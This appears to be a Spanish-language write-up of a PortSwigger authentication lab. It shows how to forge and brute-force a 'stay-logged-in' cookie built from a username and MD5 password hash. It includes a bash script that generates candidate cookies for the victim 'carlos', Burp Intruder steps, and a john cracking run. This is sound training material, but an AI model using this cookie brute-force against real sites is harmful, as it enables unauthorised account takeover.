---
title: Authentication Lab 9
date: 2025-01-29 12:25:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger
  - Authentication
tags:
  - Authentication
  - Brute-forcing a stay-logged-in cookie
image:
  path: /assets/img/Authentication-Lab-9/Portswigger.png
---

## Skills

- Brute-forcing a stay-logged-in cookie

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP

## Descripción

Para `resolver` el `laboratorio`, debemos `realizar` un `ataque` de `fuerza bruta` sobre la `cookie` de Carlos para `acceder` a `Mi account`. Podemos usar nuestras credenciales `wiener:peter` para iniciar sesión, el `nombre de usuario` de la `víctima` es `carlos` y podemos usar el diccionario `Candidate passwords` [https://portswigger.net/web-security/authentication/auth-lab-passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords) para `bruteforcear` la `contraseña`

---

## Resolución

Al `acceder` a la `web` nos sale esto

![](/assets/img/Authentication-Lab-9/image_1.png)

Pulsamos sobre `My account`, nos `logueamos` usando las credenciales `wiener:peter` y marcamos la casilla de `Stay logged in`

![](/assets/img/Authentication-Lab-9/image_2.png)

En el caso de que introdujésemos `dos veces` la `contraseña incorrecta` nos `bloquearía` y deberíamos `esperar 1 minuto` para volver a intentar `introducir` las `credenciales`

![](/assets/img/Authentication-Lab-9/image_3.png)

`Rellenamos` el campo `Email`, `pulsamos` en `Update email` y `capturamos` la `petición` con `Burpsuite`

![](/assets/img/Authentication-Lab-9/image_4.png)

Si nos fijamos bien el campo `stay-logged-in` de la `cookie` está `compuesto` por el `nombre` de `usuario` y la `contraseña`

![](/assets/img/Authentication-Lab-9/image_5.png)

`Identificamos` el `tipo` de `hash` con el que se `cifra` la `contraseña`, para ello podemos usar `webs` como [https://hashes.com/en/tools/hash_identifier](https://hashes.com/en/tools/hash_identifier)

![](/assets/img/Authentication-Lab-9/image_6.png)

Otra opción sería usar `herramientas` como `hash-identifier`

```
# hash-identifier
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: 51dc30ddc473d43a6011e9ebba6ca770

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

Least Possible Hashs:
[+] RAdmin v2.x
[+] NTLM
[+] MD4
[+] MD2
[+] MD5(HMAC)
[+] MD4(HMAC)
[+] MD2(HMAC)
[+] MD5(HMAC(Wordpress))
[+] Haval-128
[+] Haval-128(HMAC)
[+] RipeMD-128
[+] RipeMD-128(HMAC)
[+] SNEFRU-128
[+] SNEFRU-128(HMAC)
[+] Tiger-128
[+] Tiger-128(HMAC)
[+] md5($pass.$salt)
[+] md5($salt.$pass)
[+] md5($salt.$pass.$salt)
[+] md5($salt.$pass.$username)
[+] md5($salt.md5($pass))
[+] md5($salt.md5($pass))
[+] md5($salt.md5($pass.$salt))
[+] md5($salt.md5($pass.$salt))
[+] md5($salt.md5($salt.$pass))
[+] md5($salt.md5(md5($pass).$salt))
[+] md5($username.0.$pass)
[+] md5($username.LF.$pass)
[+] md5($username.md5($pass).$salt)
[+] md5(md5($pass))
[+] md5(md5($pass).$salt)
[+] md5(md5($pass).md5($salt))
[+] md5(md5($salt).$pass)
[+] md5(md5($salt).md5($pass))
[+] md5(md5($username.$pass).$salt)
[+] md5(md5(md5($pass)))
[+] md5(md5(md5(md5($pass))))
[+] md5(md5(md5(md5(md5($pass)))))
[+] md5(sha1($pass))
[+] md5(sha1(md5($pass)))
[+] md5(sha1(md5(sha1($pass))))
[+] md5(strtoupper(md5($pass)))
--------------------------------------------------
```

Para `confirmar` que es `MD5` usamos este comando y vemos que `ambos hashes coinciden`

```
# echo -n 'peter' | md5sum | awk '{print $1}'
51dc30ddc473d43a6011e9ebba6ca770
```

Vemos que podemos `eliminar` el `parámetro session` y el servidor nos `asigna` una `cookie` de acuerdo al parámetro `stay-logged-in`

![](/assets/img/Authentication-Lab-9/image_7.png)

Si intentamos acceder a `/my-account?id=carlos` con el y el `stay-logged-in` tiene las `credenciales incorrectas` nos hará un `redirect` a `/login`. Sin embargo, si lo hacemos con las `credenciales correctas` nos `devolverá` un `200 OK` y no habrá ningún redirect, podemos usar esto para `bruteforcear` la `contraseña` del usuario `carlos` y `acceder` a su `cuenta`

![](/assets/img/Authentication-Lab-9/image_8.png)

Para `crear` este `valor` de la `cookie` vamos a usar el diccionario `Candidate passwords` [https://portswigger.net/web-security/authentication/auth-lab-passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords) y este `script` en `bash`

```
#!/bin/bash

while IFS= read -r line
do
  username="carlos"
  md5_hashed_password=$(echo -n "$line" | md5sum | awk '{print $1}')
  base64_hashed_password="$username:$md5_hashed_password"
  echo -n "$base64_hashed_password" | base64 >> hashed_passwords.txt
done < "passwords.txt"
```

`Mandamos` la `petición` al `Intruder` y ahí `marcamos` el `campo` de la `cookie` a `bruteforcear`

![](/assets/img/Authentication-Lab-9/image_9.png)

`Cargamos` el `diccionario` creado

![](/assets/img/Authentication-Lab-9/image_10.png)

Otra forma de `bruteforcear` sería usando las `contraseñas` de `Candidate passwords` [https://portswigger.net/web-security/authentication/auth-lab-passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords) y luego `procesar` el `payload` con `Burpsuite`

![](/assets/img/Authentication-Lab-9/image_11.png)

Si la `contraseña` es la `correcta` nos `devuelve` el `código de estado 200`, así que `filtramos` por `código` de `estado` y `obtenemos` el `hash`

![](/assets/img/Authentication-Lab-9/image_12.png)

`Obtenemos` la `contraseña` del usuario `carlos`

```
# echo 'Y2FybG9zOjkxY2IzMTVhNjQwNWJmY2MzMGUyYzQ1NzFjY2ZiOGNl' | base64 -d
carlos:91cb315a6405bfcc30e2c4571ccfb8ce 
```

El `payload` usado para la `petición` es el `número 83`, por lo tanto podemos usar awk` `para `obtener` esa `línea` del `diccionario` de contraseñas

```
# awk 'NR==83' passwords.txt 
chelsea
```

Otra forma sería `creando` un `archivo` con el hash `91cb315a6405bfcc30e2c4571ccfb8ce` en su interior y `bruteforcearlo` con `john`

```
# john --format=raw-MD5 -w passwords.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Proceeding with wordlist:/usr/share/john/password.lst
Press 'q' or Ctrl-C to abort, almost any other key for status
chelsea          (?)     
1g 0:00:00:00 DONE (2025-01-29 11:40) 100.0g/s 38400p/s 38400c/s 38400C/s 123456..larry
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

`Iniciamos sesión` en la `cuenta` de `carlos`

![](/assets/img/Authentication-Lab-9/image_13.png)

![](/assets/img/Authentication-Lab-9/image_14.png)
